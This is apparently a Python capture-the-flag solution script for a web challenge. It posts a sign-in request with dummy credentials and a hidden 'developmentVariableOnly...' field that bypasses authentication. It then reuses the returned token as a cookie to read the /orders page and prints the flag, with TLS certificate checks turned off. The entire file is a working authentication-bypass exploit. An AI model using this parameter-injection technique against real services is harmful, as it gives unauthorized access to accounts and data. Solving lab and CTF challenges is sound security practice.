#!/usr/bin/env python3

from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} https://url.for.challenge.tld")
    exit(1)
url = sys.argv[1]

s = requests.session()
s.verify = False

response = s.post(url + "/api/signin", json={
    "username": "test",
    "password": "test",
    "developmentVariableOnlyForDevelopersDoNotUsePleaseDoNotUsePleasePleasePleasePlease": True
})
response_json = response.json()
token = response_json.get("token")

response = s.get(url + "/orders", headers={
    "Cookie": "token=" + token
})
soup = BeautifulSoup(response.text, "html.parser")
flag = soup.find("code").text
print(flag)
